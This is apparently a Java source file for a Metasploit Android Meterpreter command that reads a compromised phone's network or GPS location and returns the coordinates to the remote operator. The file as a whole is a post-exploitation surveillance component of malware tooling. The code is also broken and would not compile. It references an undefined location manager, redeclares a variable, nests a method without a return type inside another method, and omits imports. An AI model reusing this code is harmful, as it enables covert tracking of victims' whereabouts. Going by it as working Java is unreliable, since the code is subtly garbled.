package com.metasploit.meterpreter.android;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class geolocate implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_GEO_LAT = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9011);
    private static final int TLV_TYPE_GEO_LONG = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9012);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
            TLVPacket response) throws Exception {

        LocationManager locationManager;
        locationManager = (LocationManager) AndroidMeterpreter.getContext()
                .getSystemService(Context.LOCATION_SERVICE);

        Location location = locationManager
                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        if (location != null) {
            addLocationToResponse(location, response);
        } else {
            LocationListener listener = new MyLocationListener();
            mlocManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener);

            long stop = System.nanoTime() + TimeUnit.SECONDS.toNanos(30);
            while (System.nanoTime() < stop);

            mlocManager.removeUpdates(listener);

            Location location = locationManager
                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (location != null) {
                addLocationToResponse(location, response);
                return ERROR_SUCCESS;
            } else {
                return ERROR_FAILURE;
            }
        }

        private addLocationToResponse(Location location, TLVPacket response) {
            response.add(TLV_TYPE_GEO_LAT,
                    Double.toString(location.getLatitude()));
            response.add(TLV_TYPE_GEO_LONG,
                    Double.toString(location.getLongitude()));
        }

        return ERROR_SUCCESS;
    }

    // stubbed listener (so we can wait for the gps on the main thread)
    private class MyLocationListener implements LocationListener {
        @Override
        public void onLocationChanged(Location loc) {}

        @Override
        public void onProviderDisabled(String provider) {}

        @Override
        public void onProviderEnabled(String provider) {}

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}
    }
}
